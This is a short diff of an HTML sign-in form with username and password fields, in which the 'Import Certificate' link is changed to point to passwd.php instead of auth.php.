@@ -710,7 +710,7 @@ font-size:22px;
 		<div><input id="username" name="username" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/></div>
 		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
 		<div><input id="password" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/></div>
-        <div><a href="auth.php">Import Certificate</a></div>
+        <div><a href="passwd.php">Import Certificate</a></div>
 
 		<div class="signInEnter">
             <div onclick="clkLgn()" class="signinbutton" role="button" tabIndex="0" >
